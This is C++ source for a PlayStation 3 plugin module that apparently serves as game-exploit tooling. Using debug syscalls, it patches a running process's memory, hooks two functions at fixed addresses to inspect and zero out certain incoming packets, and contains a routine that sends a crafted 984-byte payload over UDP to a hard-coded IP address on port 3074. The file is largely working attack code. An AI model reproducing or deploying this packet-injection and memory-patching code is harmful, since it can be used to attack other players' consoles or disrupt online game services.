#include "Includes.h"
#include "Utils.h"
#include "Payload.h"

exports_t Exports;
payload_t Payload;

SYS_MODULE_INFO(ParadoxVSH, 0, 1, 1);
SYS_MODULE_START(main_start);
SYS_MODULE_STOP(main_stop);

bool LoadModule = false;

#define min(a,b)            (((a) < (b)) ? (a) : (b))
#define SOCKET_TIME_OUT		7

unsigned int GetTickCount() {
	time_t tv = 0;
	time(&tv);
	return tv;
}

class Sockets {
private:
	static int dwSocket;
	static bool bIsConnected;

public:
	static void Close();
	static bool Connect(const char* ConnectionAddr, unsigned short Port);
	static bool Send(const char* data, unsigned int size);
	static bool Receive(char* data, unsigned int size);
	static bool ConnectUDP(const char* ConnectionAddr, unsigned short Port);
};


bool Sockets::bIsConnected = false;
int Sockets::dwSocket = 0;

void Sockets::Close() {
	if (bIsConnected) {
		shutdown(dwSocket, 2);
		socketclose(dwSocket);
	}
	bIsConnected = false;
	dwSocket = 0;
}

bool Sockets::ConnectUDP(const char* ConnectionAddr, unsigned short Port) {

	dwSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	sockaddr_in sa = {};
	sa.sin_family = AF_INET;
	sa.sin_port = htons(Port);
	sa.sin_addr.s_addr = inet_addr(ConnectionAddr);
	if (connect(dwSocket, (sockaddr*)&sa, sizeof(sa)) < 0)
		return false;

	bIsConnected = true;
	return true;
}

bool Sockets::Connect(const char* ConnectionAddr, unsigned short Port) {

	dwSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	sockaddr_in sa = {};
	sa.sin_family = AF_INET;
	sa.sin_port = htons(Port);
	sa.sin_addr.s_addr = inet_addr(ConnectionAddr);
	if (connect(dwSocket, (sockaddr*)&sa, sizeof(sa)) < 0)
		return false;

	bIsConnected = true;
	return true;
}

bool Sockets::Send(const char* data, unsigned int size) {

	if (!bIsConnected)
		return false;

	int Start = GetTickCount();

	char* CurrentPosition = (char*)data;

	int DataLeft = size;

	int SentStatus = 0;

	while (DataLeft > 0) {

		if ((GetTickCount() - Start) > SOCKET_TIME_OUT) {
			return false;
		}

		int DataChunkSize = min(1024 * 2, DataLeft);

		SentStatus = send(dwSocket, CurrentPosition, DataChunkSize, 0);

		if (SentStatus < 0)
			return false;

		DataLeft -= SentStatus;
		CurrentPosition += SentStatus;
	}
	return true;
}

bool Sockets::Receive(char* data, unsigned int size) {

	if (!bIsConnected)
		return false;

	int Start = GetTickCount();

	char* CurrentPosition = (char*)data;
	int DataLeft = size;
	int ReceiveStatus = 0;

	while (DataLeft > 0) {

		if ((GetTickCount() - Start) > SOCKET_TIME_OUT) {

			return false;
		}

		int DataChunkSize = min(1024 * 2, DataLeft);

		ReceiveStatus = recv(dwSocket, CurrentPosition, DataChunkSize, 0);

		if (ReceiveStatus < 0)
			return false;

		CurrentPosition += ReceiveStatus;
		DataLeft -= ReceiveStatus;
	}
	if (ReceiveStatus == -1)
		return false;

	return true;
}

void _sys_ppu_thread_exit(uint64_t val)
{
	system_call_1(41, val);
}


int sys_dbg_read_process_memory(uint64_t address, void* data, size_t size) {
	system_call_4(904, (uint64_t)sys_process_getpid(), address, size, (uint64_t)data);
	return_to_user_prog(int);
}

int sys_dbg_write_process_memory(uint64_t address, void* data, size_t size) {
	system_call_4(905, (uint64_t)sys_process_getpid(), address, size, (uint64_t)data);
	__dcbst((void*)address);
	__sync();
	__isync();
	return_to_user_prog(int32_t);
}

void DetourFunction(int address, int hookFunc, int stubFunc) {
	int StubData[8], FuncData[4];

	int hook_address = hookFunc != NULL ? *(int*)hookFunc : 0;
	int stub_address = stubFunc != NULL ? *(int*)stubFunc : 0;

	if (stub_address) {
		int branchAddr = address + 0x10;
		StubData[0] = 0x3D600000 + ((branchAddr >> 16) & 0xFFFF) + (branchAddr & 0x8000 ? 1 : 0);
		StubData[1] = 0x396B0000 + (branchAddr & 0xFFFF);
		StubData[2] = 0x7D6903A6;
		StubData[7] = 0x4E800420;
		sys_dbg_read_process_memory(address, &StubData[3], 0x10);
		sys_dbg_write_process_memory(stub_address, StubData, 0x20);
	}

	if (hook_address) {
		FuncData[0] = 0x3D600000 + ((hook_address >> 16) & 0xFFFF) + (hook_address & 0x8000 ? 1 : 0);
		FuncData[1] = 0x396B0000 + (hook_address & 0xFFFF);
		FuncData[2] = 0x7D6903A6;
		FuncData[3] = 0x4E800420;
		sys_dbg_write_process_memory(address, FuncData, 0x10);
	}
}

void ParadoxRun(uint64_t)
{
	printf("Shit Loading\n");

	char SamplePacket[984] = {
		0x06, 0x02, 0xF8, 0xD8, 0xDF, 0x02, 0xFA, 0xF2, 0x8A, 0x1D, 0x5C, 0xB2,
		0x6B, 0xEB, 0xC8, 0x03, 0x65, 0xD5, 0xA4, 0xC2, 0xF5, 0x3E, 0x8E, 0xE9,
		0xF4, 0x5A, 0x3A, 0x4F, 0xB0, 0x2D, 0xC1, 0xB1, 0xA9, 0x13, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB0, 0xBA, 0x1E, 0x6D, 0x0D, 0xE4, 0x60, 0xD7, 0xB0,
		0xBA, 0x1E, 0x6D, 0x0D, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1,
		0xBA, 0x1B, 0x7B, 0x0C, 0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1B, 0x7B, 0x0C,
		0xE4, 0x65, 0xC1, 0xB1, 0xBA, 0x1A, 0x7B, 0x0C, 0xE4, 0x64, 0xC1, 0xB1,
		0xBA, 0x1A, 0x7B, 0x09, 0xFD, 0x65, 0xD8, 0xA0, 0xAA, 0x0A, 0x69, 0x0B,
		0xFC, 0x63, 0xD2, 0xB5, 0xAC, 0x19, 0x6D, 0x1D, 0xF4, 0x74, 0xD0, 0xA0,
		0xAA, 0x0A, 0x6A, 0x1D, 0xF4, 0x74, 0xD0, 0xA0, 0xAA, 0x0A, 0x6A, 0x1D,
		0xF4, 0x74, 0xD7, 0xB8, 0xAD, 0x1C, 0x6D, 0x09, 0xE4, 0x54, 0x88, 0xC6
	};

	Sockets DankNess;

	if (DankNess.ConnectUDP("51.38.85.142", 3074)) {

		if (DankNess.Send(SamplePacket, 984))
		{
			printf("Data Sent\n");
		}
	}
	DankNess.Close();

	_sys_ppu_thread_exit(0);
}

int sub_3D6E78Stub(...)
{
	__asm("li %r3, 0x1");
}

int sub_3D6E78(unsigned long long unk1, unsigned char* OutBuffer, unsigned long long unk2, unsigned long long unk3, int* OutBufferSize, unsigned long long unk4, unsigned long long unk5, unsigned char* InBuffer, unsigned long long r11, unsigned long long r12, unsigned long long r13)
{
	int ret = sub_3D6E78Stub(unk1, OutBuffer, unk2, unk3, OutBufferSize, unk4, unk5, InBuffer, r11, r12, r13);

	if (*(int*)(InBuffer + 0x2) == 0xFFFFFFFF && *(int*)(InBuffer + 0x22) == 0x20343630) 
	{


		


	}

	return ret;
	
}


int sub_21EC38Stub(...)
{
	__asm("li %r3, 0x2");
}


int sub_21EC38(uint64_t r3, uint64_t r4, uint64_t r5, uint64_t r6, uint64_t r7)
{

	if (r6)
	{
		int r9 = *(int*)(r6 + 0x8);

		if (r9)
		{
			int r0 = *(int*)(r9);

			if (r0 == 0xFFFFFFFF)
			{
				unsigned char* Data = (unsigned char*)r9;

				if (*(int*)(r9 + 0x7) == 0x31706C61)
				{
					memset((void*)r9, 0, *(int*)(r6 + 0x14));
				}
			}
		}
	}


	return sub_21EC38Stub(r3, r4, r5, r6, r7);
}
int sub_3D6E78Restore[4];
int sub_21EC38Restore[4];

extern "C" int main_start(void)
{
	printf("Module Loading 5 \n");
	//sys_ppu_thread_t ParadoxThread;
	//sys_ppu_thread_create(&ParadoxThread, ParadoxRun, 0, 0x4AA, 0x1000, 0, "Paradox");

	sys_dbg_read_process_memory((unsigned long long)0x003D6E78, (void*)sub_3D6E78Restore, 4 * 4);
	sys_dbg_read_process_memory((unsigned long long)0xAF978, (void*)sub_21EC38Restore, 4 * 4);

	DetourFunction(0x003D6E78, (int)sub_3D6E78, (int)sub_3D6E78Stub);

	DetourFunction(0xAF978, (int)sub_21EC38, (int)sub_21EC38Stub);


	return SYS_PRX_RESIDENT;

}

extern "C" int main_stop(void)
{
	printf("Module Unloading 6\n");
	//LoadModule = true;

	sys_dbg_write_process_memory((unsigned long long)0x003D6E78, (void*)sub_3D6E78Restore, 4 * 4);
	sys_dbg_write_process_memory((unsigned long long)0xAF978, (void*)sub_21EC38Restore, 4 * 4);


	sleep(100);

	return SYS_PRX_RESIDENT;
}